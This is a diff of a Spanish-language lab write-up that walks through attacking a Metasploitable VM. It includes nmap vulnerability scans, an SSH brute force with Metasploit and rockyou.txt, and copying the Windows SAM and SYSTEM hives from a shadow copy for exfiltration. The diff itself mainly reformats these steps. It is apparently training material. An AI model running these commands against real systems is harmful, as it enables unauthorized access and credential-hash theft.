@@ -83,6 +83,7 @@ Permite evaluar los servicios identificados en los puertos abiertos para detecta
     nmap --script vuln -p80,445 10.0.2.15
 
 Resultado:
+
 ![Im.6.1](/assets/KILL/Im.6.1.png)
 
 ### **D: Escaneos FIN, NULL o Xmas:**
@@ -115,7 +116,8 @@ Explicación:
 - **-sV:** Permite identificar los servicios activos y determinar la versión del software que se encuentra ejecutándose en los puertos abiertos.
 
 Se ingresa:
-    sudo nmap -sV -p 22 10.0.2.15
+     
+     sudo nmap -sV -p 22 10.0.2.15
 
 Resultado:
 
@@ -136,15 +138,10 @@ Diccionarios descargados:
 
 En **Kali Linux** se envian los diccionarios descargados a la ruta: ***Downloads/diccionarios*** descomprimir con <**gzip -dk rockyou.txt.gz**> y y luego se corrobora que contenga al usuario **vagrant**:
 
-    (user㉿kali)-[~]
-    cd Downloads/
-    (user㉿kali)-[~/Downloads]
-    cd diccionarios/
-    (user㉿kali)-[~/Downloads/diccionarios]
-    ls
-               rockyou.txt.gz  top-usernames-shortlist.txt
-    (user㉿kali)-[~/Downloads/diccionarios]
-    gzip -dk rockyou.txt.gz
+     cd Downloads/
+     cd diccionarios/
+     ls
+     gzip -dk rockyou.txt.gz
  
 Resultado
 
@@ -167,9 +164,7 @@ Se crean 2 entornos de trabajo, la terminal superior será de **Linux** y la ter
 
 Se inicia Metasploitable con ***msfconsole -q***. La carga se visualiza como ***msf6***. Asimismo se tiene que cargar las herramientas de escaneo.
 
-     (user㉿kali)-[~/Downloads/diccionarios]
-     $ msfconsole -q
-     msf6>
+     msfconsole -q
 
 Resultado:
 
@@ -230,8 +225,8 @@ La terminal y comandos serían:
     msf6 auxiliary(scanner/ssh/ssh_login)>run
 
 - Se realiza el cambio de ruta y a través de 'show options' se observan las configuraciones principales como: 
-    - **SET RHOSTS IP** de la víctima: *10.0.2.15* 
-    - El username ***vagrant***
+    - **SET RHOSTS IP** de la víctima: **10.0.2.15** 
+    - El username **vagrant**
     - **PASS_FILE:** la ruta del archivo con las direcciones.
 
 Resultado:
@@ -239,13 +234,13 @@ Resultado:
 ![Im.12.1](/assets/KILL/Im.12.1.png)
 ![Im.12.2](/assets/KILL/Im.12.2.png)
 
-Se ejecuta y empieza a  realizar la búsqueda del USERNAME **'vagrant'**:
+Se ejecuta y empieza a  realizar la búsqueda del USERNAME **vagrant**:
 ![Im.12.3](/assets/KILL/Im.12.3.png)
 
 ## **ETAPA 4: Explotación y Acceso**
 
 ## **4.1. CONEXIÓN SSH**
-Ya obtenido el usuario y contraseña de la víctima **(USERNAME: vagrant, CONTRASEÑA: vagrant)**, se procede a realizar la conexión SSH con la **IP '10.0.2.15'**. Sin embargo, para un mejor entorno de ejecución se ingresa al modo/terminal 'bash' de Metasploitable:
+Ya obtenido el usuario y contraseña de la víctima **(USERNAME: vagrant, CONTRASEÑA: vagrant)**, se procede a realizar la conexión SSH con la **IP 10.0.2.15**. Sin embargo, para un mejor entorno de ejecución se ingresa al modo/terminal 'bash' de Metasploitable:
 
 ![Im.13.1](/assets/KILL/Im.13.1.png)
 
@@ -255,9 +250,9 @@ Ya obtenido el usuario y contraseña de la víctima **(USERNAME: vagrant, CONTRA
 
 Desde el lado del adversario (Metasploitable) es necesario comprobar los privilegios que se tienen a través, del comando: **whoami /priv**.
 
-- Si tenemos privilegios de administrador, deberíamos ver permisos como **'SeBackupPrivilege'** y **'SeRestorePrivilege'**.
+- Si tenemos privilegios de administrador, deberíamos ver permisos como ***SeBackupPrivilege*** y ***SeRestorePrivilege***.
 
-- Ambos son importantes para hacer la **COPIA** de un archivo en específico y exfiltrarlo/sacarlo hacia afuera (Kali Linux). Asimismo, ambos permiten crear una copia del dico C.
+- Ambos son importantes para hacer la **COPIA** de un archivo en específico y **exfiltrarlo/sacarlo** hacia afuera (Kali Linux). Asimismo, ambos permiten crear una copia del dico C.
 
 La terminal y comandos serían:
 
@@ -363,18 +358,19 @@ Líneas de comando:
     C:\Windows\Temp>
 
 Y copiar los archivos SAM y SYSTEM del volumen shadow:
+
 **SAM:**
-    cd C:\Windows\Temp>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM 
+     cd C:\Windows\Temp>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM 
 
 **SYSTEM:**
-    cd C:\Windows\Temp>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
+     cd C:\Windows\Temp>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
 
-**NOTA:** Reemplazar HarddiskVolumeShadowCopyX con el número correspondiente que el script vssown.vbs nos indicó. En este caso 'HarddiskVolumeShadowCopy1'
+**NOTA:** Reemplazar HarddiskVolumeShadowCopyX con el número correspondiente que el script vssown.vbs nos indicó. En este caso es **HarddiskVolumeShadowCopy1**
 
 Resultado:
 
 ![Im.14.8](/assets/KILL/Im.14.8.png)
-Salimos del modo cmd con 'exit'
+Salimos del modo **cmd** con **exit**.
 
 ## **ETAPA 6: Transferir los Archivos SAM y SYSTEM al atacante**
 
